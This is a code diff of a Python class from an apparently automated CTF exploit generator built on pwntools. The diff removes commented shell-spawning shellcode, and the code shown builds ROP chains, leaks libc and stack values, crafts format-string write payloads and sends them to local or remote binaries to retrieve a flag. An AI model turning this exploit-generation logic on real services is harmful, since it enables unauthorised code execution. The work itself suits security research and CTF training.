@@ -9,37 +9,8 @@ from rage.machine import Machine
 from rage.log import aegis_log
 
 class Against:
-    """Class for dealing with exploiting the binary."""
-
-    # execve("/bin/sh\x00", 0,0)
-
-    """
-    shellcode = asm(
-        movabs rbx, 0x68732f6e69622f
-        push rbx
-        mov eax, 0x3b
-        xor rsi, rsi
-        xor rdx, rdx
-        mov rdi, rsp
-        syscall
-    )
-    # open("flag.txt", 0)
-    # sendfile(0, 3, 0, 60)
-    opsf_shellcode = asm(
-        movaps rbx, 0x7616c666478747e2
-        push rbx
-        mov eax, 0x2
-        xor rsi, rsi
-        syscall
-
-        mov eax, 0x28
-        xor rdi, rdi
-        mov rsi, 0x3
-        xor rdx, rdx
-        mov r10, 0x40
-        syscall
-    )
-    """
+    """Class for generating and interfacing with the binary."""
+    
     def __init__(self, binary_path, libc, machine: Machine, ip, port, flag_format):
         """Create the against class."""
 
@@ -87,10 +58,11 @@ class Against:
         """Return the running process to a binary."""
         gs = """
             set context-sections regs disasm
-
             b vuln
+            b execve@plt
+            b system@plt
+            b win
             finish
-
         """
 
         if option == "REMOTE" and self.ip != None and self.port != None:
@@ -120,8 +92,7 @@ class Against:
         reg_size_1 = self.machine.bv.arch.regs[reg1.decode("utf-8")].size        
         reg_size_2 = self.machine.bv.arch.regs[reg2.decode("utf-8")].size
 
-        #aegis_log.debug(f"Reg size 1 {reg_size_1} Reg size 2 {reg_size_2}")
-
+        # Find smallest register size
         reg_size = 8 
         if reg_size_1 < reg_size_2:
             reg_size = reg_size_1
@@ -130,7 +101,6 @@ class Against:
         else:
             reg_size = reg_size_1
 
-        #reg_size = 8
         index = 0
         while len(string) - index > 0:
             rem = (len(string) - index) % (reg_size+1)
@@ -176,8 +146,7 @@ class Against:
         chain = b""
 
         reg_params = self.machine.sys_reg_args
-
-
+        
         if len(parameters) > 0:
             for i in range(len(parameters)):
                 reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
@@ -203,16 +172,12 @@ class Against:
             chain += p64(rop.find_gadget(["syscall", "ret"])[0])
 
         return chain
-
-
-
+        
     def rop_chain_call_function(self, function, parameters):
         """Return a rop chain to call a function with the specific parameters."""
         chain = b""
 
         reg_params = self.machine.reg_args[:len(parameters)]
-
-        chars = [b'A', b'B', b'C', b'D', b'E']
 
         if len(parameters) > 0:
             for i in range(len(parameters)):
@@ -230,7 +195,7 @@ class Against:
                                     index = reg_params.index(reg.decode("utf-8"))
                                     chain += p64(parameters[index])
                                 else:
-                                    chain += chars[i] * 8
+                                    chain += b"A" * 8
 
                             elif b"add rsp" in inst:
                                 value = int(inst.split(b",")[1].strip(), 16)
@@ -270,7 +235,7 @@ class Against:
         return chain 
 
     def recv_libc_leak(self, p, symb):
-        
+        """ Function that will take in any libc byte leak """
         pattern = re.compile(b'.{5}\x7f')
         match = None
         attempts = 0
@@ -351,11 +316,8 @@ class Against:
         string = ""
 
         aegis_log.debug(f"Performing a printf format leak: {option}")
-        # Run the process for stack len amount of times
-        # leak the entire stack.
         for i in range(1, stack_len):
 
-            
             p = self.start(option)
             offset_str = "%" + str(i) + "$p."
             p.sendline(bytes(offset_str, "utf-8"))
@@ -433,7 +395,8 @@ class Against:
 
         aegis_log.debug(f"Setting up format string write to {hex(addr)} with value {hex(value)}")
         offset = 0
-
+        
+        # Find first offset
         for i in range(1,100):
             p = process(self.binary)
             probe = "AAAAAAAZ%" + str(i) + "$p"
@@ -449,19 +412,17 @@ class Against:
         aegis_log.debug(f"Found stack offset {offset}")
         self.format_exploit = fmtstr_payload(offset, payload_writes, write_size='byte')
 
-
-    def check_bad_bytes(self):
-        for byte in self.exploit:
+    def check_exploit(self):
+        """Checks exploit for bad bytes."""
+        for byte in self.exploit: 
             if byte == 10:
-                aegis_log.error(f"Found bad byte in exploit")
+                aegis_log.error(f"Found bad byte \n in exploit")
                 return False
         return True
 
     def send_exploit(self):
-        """Send the exploit that was generated."""
         self.exploit = self.padding + self.chain
-        self.check_bad_bytes()
-
+        self.check_exploit()
 
         if len(self.exploit) > 0 and self.format_exploit == None:
             aegis_log.debug(f"Sending chain as {self.chain}") 
@@ -477,8 +438,6 @@ class Against:
             if self.debug == True:
                 self.process.interactive()
         else:
-
-            #print(self.array_exploit)
             if self.format_exploit != None and self.array_exploit == None or len(self.array_exploit) == 0: 
                 aegis_log.debug(f"Sending format string exploit as {self.format_exploit} {len(self.format_exploit)} {len(self.format_exploit) % 16}")
                 self.process.sendline(self.format_exploit)
@@ -519,8 +478,7 @@ class Against:
             #self.process.sendline(b"cat flag.txt")
 
             output = self.process.recvall(timeout=2)
-
-
+            # Don't want to print big output from format write
             if self.format_exploit == None:
                 aegis_log.debug(f"Recieved output {output}")
             if b"{" in output and b"}":
